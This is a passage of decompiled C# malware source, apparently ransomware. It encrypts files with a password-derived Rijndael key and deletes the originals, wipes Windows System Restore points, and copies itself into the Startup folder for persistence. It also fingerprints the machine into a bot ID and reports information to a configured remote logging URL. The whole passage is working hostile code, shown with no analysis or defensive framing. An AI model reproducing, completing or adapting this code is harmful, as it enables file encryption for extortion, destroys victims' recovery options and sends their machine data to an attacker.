					if (Direction == CryptoAction.ActionEncrypt)
					{
						goto IL_007c;
					}
					goto IL_00c6;
					IL_007c:
					num = 11;
					cryptoStream = new CryptoStream(fsOutput, rijndaelManaged.CreateEncryptor(bytKey, bytIV), CryptoStreamMode.Write);
					goto IL_00c6;
					IL_00c6:
					num = 14;
					if (num5 < length)
					{
						goto IL_0097;
					}
					goto IL_00d1;
					IL_00d1:
					num = 19;
					cryptoStream.Close();
					goto IL_00db;
					IL_00db:
					num = 20;
					fsInput.Close();
					goto IL_00e8;
					IL_00e8:
					num = 21;
					fsOutput.Close();
					goto IL_00f5;
					IL_00f5:
					num = 22;
					if (Direction != CryptoAction.ActionEncrypt)
					{
						goto end_IL_0001_3;
					}
					goto IL_00ff;
					IL_00ff:
					num = 23;
					fileInfo = new FileInfo(strInputFile);
					break;
					IL_0097:
					num = 15;
					num6 = fsInput.Read(buffer, 0, 4096);
					goto IL_00ad;
					end_IL_0001_2:
					break;
				}
				num = 24;
				fileInfo.Delete();
				break;
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 401;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private static byte[] CreateKey(string strPassword)
	{
		char[] array = strPassword.ToCharArray();
		int upperBound = array.GetUpperBound(0);
		checked
		{
			byte[] array2 = new byte[upperBound + 1];
			int upperBound2 = array.GetUpperBound(0);
			for (int i = 0; i <= upperBound2; i++)
			{
				array2[i] = (byte)Strings.Asc(array[i]);
			}
			SHA512Managed sHA512Managed = new SHA512Managed();
			byte[] array3 = sHA512Managed.ComputeHash(array2);
			byte[] array4 = new byte[32];
			int num = 0;
			do
			{
				array4[num] = array3[num];
				num++;
			}
			while (num <= 31);
			return array4;
		}
	}

	private static byte[] CreateIV(string strPassword)
	{
		char[] array = strPassword.ToCharArray();
		int upperBound = array.GetUpperBound(0);
		checked
		{
			byte[] array2 = new byte[upperBound + 1];
			int upperBound2 = array.GetUpperBound(0);
			for (int i = 0; i <= upperBound2; i++)
			{
				array2[i] = (byte)Strings.Asc(array[i]);
			}
			SHA512Managed sHA512Managed = new SHA512Managed();
			byte[] array3 = sHA512Managed.ComputeHash(array2);
			byte[] array4 = new byte[16];
			int num = 32;
			do
			{
				array4[num - 32] = array3[num];
				num++;
			}
			while (num <= 47);
			return array4;
		}
	}

	public static object startup(string filename)
	{
		object result = default(object);
		try
		{
			string text = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + Class1.Settings.mute + ".exe";
			if (File.Exists(text))
			{
				protect = new FileStream(text, FileMode.Open);
				return result;
			}
			File.Copy(filename, text);
			protect = new FileStream(text, FileMode.Open);
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	[DllImport("Srclient.dll")]
	public static extern int SRRemoveRestorePoint(int index);

	private static void DeleteRestorePoints()
	{
		//IL_000b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0015: Expected O, but got Unknown
		//IL_0010: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_002c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0032: Expected O, but got Unknown
		try
		{
			ManagementClass val = new ManagementClass("\\\\.\\root\\default", "systemrestore", new ObjectGetOptions());
			ManagementObjectCollection instances = val.GetInstances();
			ManagementObjectEnumerator enumerator = default(ManagementObjectEnumerator);
			try
			{
				enumerator = instances.GetEnumerator();
				while (enumerator.MoveNext())
				{
					ManagementObject val2 = (ManagementObject)enumerator.get_Current();
					SRRemoveRestorePoint(Conversions.ToInteger(Conversions.ToUInteger(((ManagementBaseObject)val2).get_Item("sequencenumber")).ToString()));
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static object Bot()
	{
		try
		{
			return Operators.ConcatenateObject(Operators.ConcatenateObject(UserName(), (object)"_"), (object)HWID());
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			object result = "Error";
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static object UserName()
	{
		try
		{
			return Environment.UserName;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			object result = "Error";
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static string HWID()
	{
		try
		{
			string text = Identifier("Win32_Processor", "ProcessorId");
			text = text + "-" + Identifier("Win32_BIOS", "SerialNumber");
			text = text + "-" + Identifier("Win32_BaseBoard", "SerialNumber");
			text = text + "-" + Identifier("Win32_VideoController", "Name");
			return MD5HASH(text);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = "Error";
			ProjectData.ClearProjectError();
			return result;
		}
	}

	private static string Identifier(string wmiClass, string wmiProperty)
	{
		//IL_0008: Unknown result type (might be due to invalid IL or missing references)
		//IL_000e: Expected O, but got Unknown
		//IL_0026: Unknown result type (might be due to invalid IL or missing references)
		//IL_002d: Expected O, but got Unknown
		try
		{
			string text = "";
			ManagementClass val = new ManagementClass(wmiClass);
			ManagementObjectCollection instances = val.GetInstances();
			ManagementObjectEnumerator enumerator = default(ManagementObjectEnumerator);
			try
			{
				enumerator = instances.GetEnumerator();
				while (enumerator.MoveNext())
				{
					ManagementObject val2 = (ManagementObject)enumerator.get_Current();
					if (Operators.CompareString(text, "", false) == 0)
					{
						try
						{
							text = ((ManagementBaseObject)val2).get_Item(wmiProperty).ToString();
						}
						catch (Exception projectError)
						{
							ProjectData.SetProjectError(projectError);
							ProjectData.ClearProjectError();
							continue;
						}
						break;
					}
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			return text;
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			string result = "Error";
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static string MD5HASH(string input)
	{
		checked
		{
			try
			{
				MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
				byte[] array = mD5CryptoServiceProvider.ComputeHash(Encoding.UTF8.GetBytes(input));
				StringBuilder stringBuilder = new StringBuilder();
				int num = array.Length - 1;
				for (int i = 10; i <= num; i++)
				{
					stringBuilder.Append(array[i].ToString("x2"));
				}
				return stringBuilder.ToString().ToUpper();
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				string result = "Error";
				ProjectData.ClearProjectError();
				return result;
			}
		}
	}

	public static bool sends(string info)
	{
		bool result = default(bool);
		try
		{
			string requestUriString = Class1.Settings.logg + "?" + info;
			WebRequest webRequest = WebRequest.Create(requestUriString);
			WebResponse response = webRequest.GetResponse();
			Stream responseStream = response.GetResponseStream();
			StreamReader streamReader = new StreamReader(responseStream);
			streamReader.ReadToEnd();
			streamReader.Close();
			response.Close();
			result = true;
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return result;
		}
	}
}
